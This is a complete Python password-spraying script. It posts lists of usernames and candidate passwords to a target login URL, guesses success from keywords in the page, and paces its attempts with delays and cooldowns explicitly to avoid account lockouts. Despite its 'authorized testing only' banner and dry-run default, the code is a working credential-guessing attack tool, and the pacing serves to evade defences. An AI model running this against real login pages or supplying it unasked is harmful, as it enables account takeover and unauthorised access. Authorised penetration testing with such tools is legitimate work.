#!/usr/bin/env python3

import argparse
import sys
import time
from pathlib import Path
from typing import Iterable, List

import requests


def load_wordlist(filename: Path) -> List[str]:
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]


def analyze_response(response, success_tokens: Iterable[str], failure_tokens: Iterable[str]) -> str:
    content = response.text.lower()
    if any(token in content for token in success_tokens):
        return 'success'
    if any(token in content for token in failure_tokens):
        return 'failure'
    return 'unknown'


def spray_passwords(
    url: str,
    usernames: List[str],
    passwords: List[str],
    *,
    dry_run: bool = True,
    delay: float = 3,
    batch_size: int = 5,
    cooldown: float = 60,
    user_agent: str = "User1111/PasswordSpray",
    success_tokens: Iterable[str] = ("welcome", "dashboard", "logout"),
    failure_tokens: Iterable[str] = ("invalid", "locked", "failed", "expired"),
) -> None:
    headers = {"User-Agent": user_agent}
    session = requests.Session()
    attempts = 0

    for password in passwords:
        for user in usernames:
            print(f"[~] Trying {user}:{password}")
            if not dry_run:
                try:
                    response = session.post(
                        url,
                        data={"username": user, "password": password},
                        headers=headers,
                        timeout=10,
                        allow_redirects=True,
                    )
                    result = analyze_response(response, success_tokens, failure_tokens)
                    if response.status_code in (200, 302) and result == 'success':
                        print(f"[+] Likely success for {user}:{password}")
                    elif result == 'failure':
                        print(f"[-] Explicit failure for {user}")
                    else:
                        print(f"[?] Indeterminate response ({response.status_code}) for {user}")
                except Exception as e:
                    print(f"[!] Error trying {user}: {e}")
            attempts += 1
            time.sleep(delay)
            if attempts % batch_size == 0:
                print(f"[*] Cooling down for {cooldown} seconds to avoid lockouts...")
                time.sleep(cooldown)


def load_usernames(filename):
    return load_wordlist(Path(filename))

def main():
    parser = argparse.ArgumentParser(description="Safe and ethical password spraying tool for authorized use only.")
    parser.add_argument('-u', '--userfile', required=True, help="File with usernames, one per line")
    parser.add_argument('-p', '--password', help="Single password to spray")
    parser.add_argument('--password-file', help="File containing multiple candidate passwords")
    parser.add_argument('-t', '--target', required=True, help="Login URL to test against (e.g., http://localhost/login)")
    parser.add_argument('--delay', type=float, default=3, help="Delay between attempts in seconds (default: 3)")
    parser.add_argument('--batch-size', type=int, default=5, help="Attempts before triggering cooldown")
    parser.add_argument('--cooldown', type=float, default=60, help="Cooldown duration in seconds")
    parser.add_argument('--user-agent', default='User1111/PasswordSpray', help="Custom User-Agent string")
    parser.add_argument('--success-token', action='append', default=['welcome', 'dashboard', 'logout'], help="Keyword indicating success")
    parser.add_argument('--failure-token', action='append', default=['invalid', 'locked', 'failed', 'expired'], help="Keyword indicating failure")
    parser.add_argument('--live', action='store_true', help="Actually perform the spray (not just dry run)")

    args = parser.parse_args()

    if bool(args.password) == bool(args.password_file):
        parser.error('Provide exactly one of --password or --password-file')

    print("### WARNING: This tool is for authorized testing only. ###")
    if not args.live:
        print("[!] Dry run only. Use --live to perform real requests.")
    else:
        print("[!] LIVE MODE ENABLED. Ensure you are authorized to test this target.")

    usernames = load_usernames(args.userfile)
    passwords = [args.password] if args.password else load_wordlist(Path(args.password_file))
    spray_passwords(
        args.target,
        usernames,
        passwords,
        dry_run=not args.live,
        delay=args.delay,
        batch_size=args.batch_size,
        cooldown=args.cooldown,
        user_agent=args.user_agent,
        success_tokens=args.success_token,
        failure_tokens=args.failure_token,
    )

if __name__ == "__main__":
    main()
